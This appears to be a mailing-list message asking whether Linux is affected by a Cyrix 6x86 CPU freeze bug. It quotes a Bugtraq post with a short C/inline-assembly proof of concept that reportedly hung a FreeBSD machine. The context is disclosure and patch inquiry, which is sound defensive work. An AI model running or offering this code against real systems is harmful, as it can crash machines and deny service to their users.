Hi,
Is Linux affected with this and is there any patch for that?
Hi,

----- from Bugtraq -----
Ragnar Hojland Espinosa [ragnar@redestb.es] mailed me a
modified version of the freeze program that runs on FreeBSD:
int main()
{
   asm ("foo:");
   asm ("cwtl");
   asm ("orl $0xe6ebe020,%eax");
   asm ("jle foo");
   asm ("addb %al,(%eax)");
   return 0;
}
I compiled and ran it, the machine was dead.
CPU: Cyrix 6x86 (486-class CPU)
  Origin = "CyrixInstead"  DIR=0x2231  Stepping=2  Revision=2
Running at 150 mhz.
